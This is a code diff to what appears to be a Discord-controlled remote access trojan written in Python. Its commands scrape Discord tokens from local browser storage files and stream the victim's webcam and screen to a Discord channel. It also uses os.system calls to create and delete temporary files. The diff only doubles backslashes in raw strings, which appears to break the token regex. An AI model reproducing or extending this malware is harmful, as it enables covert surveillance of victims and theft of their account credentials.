@@ -287,7 +287,7 @@ async def TokenExtractor_command(ctx: SlashContext):
                 if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                     continue
                 for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                    for regex in (r"[\\w-]{24}\.[\\w-]{6}\.[\\w-]{27}", r"mfa\.[\\w-]{84}"):
                         for token in re.findall(regex, line):
                             tokens.append(token)
         for token in tokens:
@@ -423,18 +423,18 @@ async def StreamWebCam_command(ctx: SlashContext):
         camera_port = 0
         camera = cv2.VideoCapture(camera_port)
         running = ctx
-        file = temp + r"\hobo\hello.txt"
+        file = temp + r"\\hobo\\hello.txt"
         if os.path.isfile(file):
             delelelee = "del " + file + r" /f"
             os.system(delelelee)
-            os.system(r"RMDIR %temp%\hobo /s /q")
+            os.system(r"RMDIR %temp%\\hobo /s /q")
         while True:
             return_value, image = camera.read()
-            cv2.imwrite(temp + r"\temp.png", image)
-            boom = discord.File(temp + r"\temp.png", filename="temp.png")
+            cv2.imwrite(temp + r"\\temp.png", image)
+            boom = discord.File(temp + r"\\temp.png", filename="temp.png")
             kool = await ctx.send(file=boom)
             temp = (os.getenv('TEMP'))
-            file = temp + r"\hobo\hello.txt"
+            file = temp + r"\\hobo\\hello.txt"
             if os.path.isfile(file):
                 del camera
                 break
@@ -447,9 +447,9 @@ async def StreamWebCam_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
         await ctx.send("Command successfuly executed")
         import os
-        os.system(r"mkdir %temp%\hobo")
-        os.system(r"echo hello>%temp%\hobo\hello.txt")
-        os.system(r"del %temp\temp.png /F")
+        os.system(r"mkdir %temp%\\hobo")
+        os.system(r"echo hello>%temp%\\hobo\\hello.txt")
+        os.system(r"del %temp\\temp.png /F")
 
 
 @slash.slash(name="DisplayOFF", description="Turns users Display OFF, Admin rights needed!", guild_ids=g)
@@ -500,20 +500,20 @@ async def StreamScreen_command(ctx: SlashContext):
         import os
         from mss import mss
         temp = (os.getenv('TEMP'))
-        hellos = temp + r"\hobos\hellos.txt"        
+        hellos = temp + r"\\hobos\\hellos.txt"        
         if os.path.isfile(hellos):
-            os.system(r"del %temp%\hobos\hellos.txt /f")
-            os.system(r"RMDIR %temp%\hobos /s /q")      
+            os.system(r"del %temp%\\hobos\\hellos.txt /f")
+            os.system(r"RMDIR %temp%\\hobos /s /q")      
         else:
             pass
         while True:
             with mss() as sct:
-                sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
-            path = (os.getenv('TEMP')) + r"\monitor.png"
+                sct.shot(output=os.path.join(os.getenv('TEMP') + r"\\monitor.png"))
+            path = (os.getenv('TEMP')) + r"\\monitor.png"
             file = discord.File((path), filename="monitor.png")
             await ctx.send(file=file)
             temp = (os.getenv('TEMP'))
-            hellos = temp + r"\hobos\hellos.txt"
+            hellos = temp + r"\\hobos\\hellos.txt"
             if os.path.isfile(hellos):
                 break
             else:
@@ -524,9 +524,9 @@ async def StreamScreen_command(ctx: SlashContext):
 async def StreamScreen_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
         import os
-        os.system(r"mkdir %temp%\hobos")
-        os.system(r"echo hello>%temp%\hobos\hellos.txt")
-        os.system(r"del %temp%\monitor.png /F")
+        os.system(r"mkdir %temp%\\hobos")
+        os.system(r"echo hello>%temp%\\hobos\\hellos.txt")
+        os.system(r"del %temp%\\monitor.png /F")
         await ctx.send("Command successfuly executed")
 
 
@@ -1154,3 +1154,8 @@ def main(discord_webhook_url):
         sys.exit(-1)
 
 client.run(token)
+
+
+
+
+
